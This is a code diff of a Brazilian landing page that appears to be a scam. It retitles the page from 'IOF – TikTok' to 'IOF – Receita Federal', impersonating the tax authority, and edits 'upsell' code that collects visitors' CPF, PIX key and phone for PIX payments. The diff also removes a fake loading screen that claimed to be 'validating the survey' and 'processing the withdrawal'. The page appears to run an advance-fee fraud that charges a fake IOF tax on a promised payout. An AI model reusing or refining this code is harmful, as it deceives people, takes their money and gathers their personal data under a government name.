@@ -8,7 +8,7 @@
   document.head.appendChild(a);
 </script>
 	<meta charset="UTF-8">
-		<title>IOF – TikTok</title>
+		<title>IOF – Receita Federal</title>
 <meta name="robots" content="max-image-preview:large">
 	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
 	<link rel="alternate" type="application/rss+xml" title="Feed para TikTok »" href="https://respostaspremiada.com/feed/">
@@ -509,7 +509,10 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15
   const up3PixKey = (up3Params.get("chave_pix") || up3Params.get("cpf") || up3Cpf).trim();
   const up3LeadPhone = (up3Params.get("phone") || up3Params.get("telefone") || "").replace(/\D/g, "");
 
-  let up3SessionId = localStorage.getItem(UP3_SESSION_KEY) || "";
+  // Para upsell, não reaproveitamos sessões antigas ao reabrir a página.
+  // Isso evita herdar PIXs de visitas passadas e mantém o anti-flood apenas dentro da mesma visita.
+  try { localStorage.removeItem(UP3_SESSION_KEY); } catch (e) {}
+  let up3SessionId = "";
   let up3PollTimer = null;
   let up3PollStartedAt = 0;
   let up3ExpiresAtRaw = null;
@@ -758,88 +761,5 @@ window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15
 					document.addEventListener( event, lazyloadRunObserver );
 				} );
 			</script>
-			<script src="js/hello-frontend.min.js" id="hello-theme-frontend-js"></script>
-<script id="eael-general-js-extra">
-var localize = {"ajaxurl":"https:\/\/respostaspremiada.com\/wp-admin\/admin-ajax.php","nonce":"3c3e043fe9","i18n":{"added":"Adicionado ","compare":"Comparar","loading":"Carregando..."},"eael_translate_text":{"required_text":"\u00e9 um campo obrigat\u00f3rio","invalid_text":"Inv\u00e1lido","billing_text":"Faturamento","shipping_text":"Envio","fg_mfp_counter_text":"de"},"page_permalink":"https:\/\/respostaspremiada.com\/tiktokiof\/","cart_redirectition":"","cart_page_url":"","el_breakpoints":{"mobile":{"label":"Dispositivos m\u00f3veis no modo retrato","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Dispositivos m\u00f3veis no modo paisagem","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet no modo retrato","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet no modo paisagem","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Notebook","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Tela ampla (widescreen)","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}};
-</script>
-<script src="js/general.min.js" id="eael-general-js"></script>
-<script src="js/webpack-pro.runtime.min.js" id="elementor-pro-webpack-runtime-js"></script>
-<script src="js/webpack.runtime.min.js" id="elementor-webpack-runtime-js"></script>
-<script src="js/frontend-modules.min.js" id="elementor-frontend-modules-js"></script>
-<script src="js/hooks.min.js" id="wp-hooks-js"></script>
-<script src="js/i18n.min.js" id="wp-i18n-js"></script>
-<script id="wp-i18n-js-after">
-wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
-</script>
-<script id="elementor-pro-frontend-js-before">
-var ElementorProFrontendConfig = {"ajaxurl":"https:\/\/respostaspremiada.com\/wp-admin\/admin-ajax.php","nonce":"c34a272719","urls":{"assets":"https:\/\/respostaspremiada.com\/wp-content\/plugins\/elementor-pro\/assets\/","rest":"https:\/\/respostaspremiada.com\/wp-json\/"},"settings":{"lazy_load_background_images":true},"popup":{"hasPopUps":false},"shareButtonsNetworks":{"facebook":{"title":"Facebook","has_counter":true},"twitter":{"title":"Twitter"},"linkedin":{"title":"LinkedIn","has_counter":true},"pinterest":{"title":"Pinterest","has_counter":true},"reddit":{"title":"Reddit","has_counter":true},"vk":{"title":"VK","has_counter":true},"odnoklassniki":{"title":"OK","has_counter":true},"tumblr":{"title":"Tumblr"},"digg":{"title":"Digg"},"skype":{"title":"Skype"},"stumbleupon":{"title":"StumbleUpon","has_counter":true},"mix":{"title":"Mix"},"telegram":{"title":"Telegram"},"pocket":{"title":"Pocket","has_counter":true},"xing":{"title":"XING","has_counter":true},"whatsapp":{"title":"WhatsApp"},"email":{"title":"Email"},"print":{"title":"Print"},"x-twitter":{"title":"X"},"threads":{"title":"Threads"}},"facebook_sdk":{"lang":"pt_BR","app_id":""},"lottie":{"defaultAnimationUrl":"https:\/\/respostaspremiada.com\/wp-content\/plugins\/elementor-pro\/modules\/lottie\/assets\/animations\/default.json"}};
-</script>
-<script src="js/frontend.min.js" id="elementor-pro-frontend-js"></script>
-<script src="js/core.min.js" id="jquery-ui-core-js"></script>
-<script id="elementor-frontend-js-before">
-var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Compartilhar no Facebook","shareOnTwitter":"Compartilhar no Twitter","pinIt":"Fixar","download":"Baixar","downloadImage":"Baixar imagem","fullscreen":"Tela cheia","zoom":"Zoom","share":"Compartilhar","playVideo":"Reproduzir v\u00eddeo","previous":"Anterior","next":"Pr\u00f3ximo","close":"Fechar","a11yCarouselPrevSlideMessage":"Slide anterior","a11yCarouselNextSlideMessage":"Pr\u00f3ximo slide","a11yCarouselFirstSlideMessage":"Este \u00e9 o primeiro slide","a11yCarouselLastSlideMessage":"Este \u00e9 o \u00faltimo slide","a11yCarouselPaginationBulletMessage":"Ir para o slide"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":1025,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Dispositivos m\u00f3veis no modo retrato","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Dispositivos m\u00f3veis no modo paisagem","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet no modo retrato","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet no modo paisagem","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Notebook","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Tela ampla (widescreen)","value":2400,"default_value":2400,"direction":"min","is_enabled":false}},"hasCustomBreakpoints":false},"version":"3.26.3","is_static":false,"experimentalFeatures":{"additional_custom_breakpoints":true,"container":true,"e_swiper_latest":true,"e_nested_atomic_repeaters":true,"e_onboarding":true,"e_css_smooth_scroll":true,"theme_builder_v2":true,"hello-theme-header-footer":true,"home_screen":true,"landing-pages":true,"nested-elements":true,"editor_v2":true,"link-in-bio":true,"floating-buttons":true},"urls":{"assets":"https:\/\/respostaspremiada.com\/wp-content\/plugins\/elementor\/assets\/","ajaxurl":"https:\/\/respostaspremiada.com\/wp-admin\/admin-ajax.php","uploadUrl":"https:\/\/respostaspremiada.com\/wp-content\/uploads"},"nonces":{"floatingButtonsClickTracking":"d270dbf414"},"swiperClass":"swiper","settings":{"page":[],"editorPreferences":[]},"kit":{"body_background_background":"classic","active_breakpoints":["viewport_mobile","viewport_tablet"],"global_image_lightbox":"yes","lightbox_enable_counter":"yes","lightbox_enable_fullscreen":"yes","lightbox_enable_zoom":"yes","lightbox_enable_share":"yes","lightbox_title_src":"title","lightbox_description_src":"description","hello_header_logo_type":"logo","hello_footer_logo_type":"logo"},"post":{"id":1379,"title":"IOF%20%E2%80%93%20TikTok","excerpt":"","featuredImage":false}};
-</script>
-<script src="js/frontend.min_1.js" id="elementor-frontend-js"></script>
-<script src="js/elements-handlers.min.js" id="pro-elements-handlers-js"></script>
-<script>var localize ={"ajaxurl":"https:\/\/respostaspremiada.com\/wp-admin\/admin-ajax.php","nonce":"3c3e043fe9","i18n":{"added":"Adicionado ","compare":"Comparar","loading":"Carregando..."},"eael_translate_text":{"required_text":"\u00e9 um campo obrigat\u00f3rio","invalid_text":"Inv\u00e1lido","billing_text":"Faturamento","shipping_text":"Envio","fg_mfp_counter_text":"de"},"page_permalink":"https:\/\/respostaspremiada.com\/tiktokiof\/","cart_redirectition":false,"cart_page_url":"","el_breakpoints":{"mobile":{"label":"Dispositivos m\u00f3veis no modo retrato","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Dispositivos m\u00f3veis no modo paisagem","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet no modo retrato","value":1024,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet no modo paisagem","value":1200,"default_value":1200,"direction":"max","is_enabled":false},"laptop":{"label":"Notebook","value":1366,"default_value":1366,"direction":"max","is_enabled":false},"widescreen":{"label":"Tela ampla (widescreen)","value":2400,"default_value":2400,"direction":"min","is_enabled":false}}}</script><script id="eael-inline-js">document.addEventListener('DOMContentLoaded', function() {
-  var preloaderFake = document.getElementById("preloader-fake");
-  var loadingPage = document.getElementById("loading-page");
-  var statusText = document.getElementById("status-text");
-  var progressBarFill = document.getElementById("progress-bar-fill");
-  var pageContent = document.getElementById("main-content"); // Usaremos um wrapper para o conteúdo principal
-
-  if (pageContent) {
-    // Oculta o conteúdo principal da página inicialmente
-    pageContent.style.opacity = "0";
-    pageContent.style.visibility = "hidden";
-  }
-
-  // Garante que o preloader esteja visível
-  preloaderFake.style.opacity = "1";
-  preloaderFake.style.visibility = "visible";
-  loadingPage.style.opacity = "1";
-  loadingPage.style.visibility = "visible";
-
-  // Função para atualizar o status
-  function updateStatus(text, progress) {
-    statusText.style.opacity = 0;
-    statusText.style.transform = "translateY(20px)";
-    
-    setTimeout(function() {
-      statusText.innerText = text;
-      statusText.style.opacity = 1;
-      statusText.style.transform = "translateY(0)";
-      progressBarFill.style.width = progress + "%";
-    }, 300);
-  }
-
-  // Sequência de carregamento
-  setTimeout(function () {
-    preloaderFake.style.opacity = 0;
-    preloaderFake.style.visibility = "hidden";
-    loadingPage.style.visibility = "visible";
-    loadingPage.style.opacity = 1;
-
-    updateStatus("Validando pesquisa", 30);
-
-    setTimeout(function() {
-      updateStatus("Processando saque...", 60);
-    }, 2000);
-
-    setTimeout(function() {
-      updateStatus("Pronto!", 100);
-    }, 4000);
-
-    setTimeout(function() {
-      loadingPage.style.opacity = 0;
-      loadingPage.style.visibility = "hidden";
-      
-      // Revela o conteúdo da página
-      if (pageContent) {
-        pageContent.style.opacity = "1";
-        pageContent.style.visibility = "visible";
-      }
-      document.body.style.overflow = "auto";
-    }, 5000);
-  }, 400);
-});;</script></body></html>
+		</body>
+		</html>
